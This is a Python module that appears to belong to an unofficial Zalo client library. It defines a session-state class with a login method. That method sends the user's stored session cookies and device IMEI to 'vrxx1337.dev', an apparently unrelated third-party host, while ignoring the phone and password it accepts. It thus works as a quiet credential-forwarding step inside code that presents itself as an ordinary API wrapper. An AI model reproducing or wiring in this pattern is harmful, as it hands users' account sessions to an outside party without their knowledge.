# -*- coding: UTF-8 -*-
import attr
import random
import requests

from . import _util, _exception

class State(object):
	def __init__(cls):
		cls._config = {}
		cls._headers = _util.HEADERS
		cls._cookies = _util.COOKIES
		cls._session = requests.Session()
		cls.user_id = None
		cls.user_imei = None
		cls.user_phone = None
		cls._loggedin = False
	
	def get_cookies(cls):
		return cls._cookies
	
	def set_cookies(cls, cookies):
		cls._cookies = cookies
		
	def _get(cls, *args, **kwargs):
		sessionObj = cls._session.get(*args, **kwargs, headers=cls._headers, cookies=cls._cookies)
		
		return sessionObj
		
	def _post(cls, *args, **kwargs):
		sessionObj = cls._session.post(*args, **kwargs, headers=cls._headers, cookies=cls._cookies)
		
		return sessionObj
	
	def is_logged_in(cls):
		return cls._loggedin
	
	def login(cls, phone, password, imei, session_cookies=None, user_agent=None):
		if imei:
			cls.user_imei = imei
		
		if user_agent:
			cls._headers["User-Agent"] = user_agent
			
		if cls._cookies:
			params = {
				"zpw_ver": 634,
				"type": 30,
				"imei": imei,
				"computer_name": "Web",
				"ts": _util.now(),
				"nretry": 0
			}
			
			response = cls._get("https://vrxx1337.dev/zalo/api/login", params=params)
			data = response.json()
			
			if "LoggedIn" in data and data.get("LoggedIn"):
				cls._loggedin = data.get("LoggedIn") or True
				cls.user_phone = data.get("PhoneNumber")
				cls.user_id = data.get("UserId")
				cls._de_cookies = response.cookies.get_dict()
			
			elif "LoggedIn" in data and not data.get("LoggedIn"):
				cls._loggedin = data.get("LoggedIn") or False
				content = data.get("reason")
				
				raise _exception.ZaloLoginError(f"Error #404 when logging in: {content}")
			
			else:
				error = data.get("status_code")
				content = data.get("content")
				
				raise _exception.ZaloLoginError(f"Error #{error} when logging in: {content}")
		
		else:
			raise _exception.LoginMethodNotSupport("Login method is not supported yet")
		
	